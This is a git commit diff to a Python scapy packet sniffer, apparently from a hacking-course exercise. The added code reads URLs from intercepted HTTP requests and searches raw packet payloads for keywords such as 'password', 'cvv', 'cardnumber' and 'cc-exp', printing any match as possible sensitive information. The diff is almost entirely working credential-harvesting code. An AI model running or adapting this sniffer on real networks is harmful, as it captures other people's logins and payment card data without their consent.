2a74f7410d78b868e039e2735161914ca7c915f7
Angel Diaz <angel.diaz@gmail.com>
2019-03-12 16:57:32 +0100

    packet filtering sensitive info

--- packetsniffer.py
+++ packetsniffer.py
@@ -10,10 +10,46 @@ def sniff(interface):
     # Filter: arp, tcp, udp, port 22...
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_sensitive_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = [
+            "username",
+            "user",
+            "password",
+            "pass",
+            "email",
+            "cvc",
+            "cvv",
+            "card",
+            "ccname",
+            "cardnumber",
+            "cc-exp",
+            "name",
+            "phone"
+        ]
+        for kwd in keywords:
+            if kwd in load:
+                return load
+        return False
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        print(packet.summary())
+        # print(packet.show())
+        # print(packet[Ethernet].src + packet[Ethernet].dst)
+        url = get_url(packet)
+        print("[+] " + packet[http.HTTPRequest].Method + " " + url)
+        sensitive_info = get_sensitive_info(packet)
+        if sensitive_info:
+            print("\n\n[+] Possible sensitive information: " + sensitive_info + "\n\n")
 
 # Launch script
 os.system('clear')
+print("[+] Sniffing packets...")
 sniff("en0")
